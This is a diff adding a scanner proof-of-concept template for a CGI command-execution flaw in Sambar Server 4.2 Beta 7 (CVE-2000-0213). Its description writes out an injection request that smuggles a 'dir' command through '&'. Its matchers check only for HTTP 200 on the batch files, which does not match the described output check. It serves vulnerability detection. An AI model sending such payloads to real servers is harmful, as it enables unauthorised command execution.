@@ -1,0 +1,39 @@
+[info]
+author = "AVE"
+description = 'Sambar Server 4.2 Beta 7 在 CGI 目录下默认包含 ECHO.BAT 和 HELLO.BAT 批处理文件，远程攻击者可通过在 HTTP 请求中注入 shell 元字符（如 & 管道符）执行任意系统命令。通过发送 /cgi-bin/hello.bat?&dir+c:\ 请求，检测响应中是否包含 dir 命令输出特征来判断漏洞是否存在。'
+id = "POC-AVE-2000-0188"
+name = "Sambar Server 4.2 Beta 7 CGI命令执行漏洞 PoC"
+severity = "medium"
+tags = [
+    "cve-2000-0213",
+    "sambar",
+    "cgi",
+    "command-execution",
+]
+vuln_id = [
+    "CVE-2000-0213",
+    "AVE-2000-0188",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/hello.bat"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/echo.bat"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
